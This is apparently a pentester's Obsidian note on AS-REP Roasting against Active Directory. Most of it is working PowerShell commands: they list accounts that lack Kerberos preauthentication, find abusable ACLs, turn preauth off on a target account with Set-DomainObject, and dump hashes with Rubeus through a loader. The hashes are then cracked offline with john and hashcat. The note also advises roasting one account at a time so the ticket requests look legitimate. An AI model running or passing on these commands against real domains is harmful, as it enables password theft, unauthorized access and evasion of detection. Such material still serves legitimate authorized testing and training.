If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline

With sufficient rights (`GenericWrite` or `GenericAll`), Kerberos preauth can be forced disabled as well. **Targeted AS-REP Roasting to get a user password**

---
Discover AS-REP Roastable users (PowerView + AD Module)
```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -
Properties DoesNotRequirePreAuth
```
---
**Targeted AS-REP Roast** - force disable Kerberos Preauth

Find possible ACLs to leverage
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

Force disable Kerberos Preauth
```powershell
Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
```

Verify
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```
---
**DO ONE ACCOUNT AT A TIME TO HAVE THE TICKET REQUESTS LOOK LEGITIMATE**

AS-REP BBQ
```powershell
.\Loader.exe -path .\Rubeus.exe asreproast /user:VPN1user /outfile:VPN1user_asrep.txt
```

Crack
```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-
pass.txt VPN1user_asrep.txt

hashcat -m 18200 VPN1user_asrep.txt ~/rockyou.txt -O -r ~/opt/wordlists/best64.rule
```

![[Pasted image 20250514193601.png]]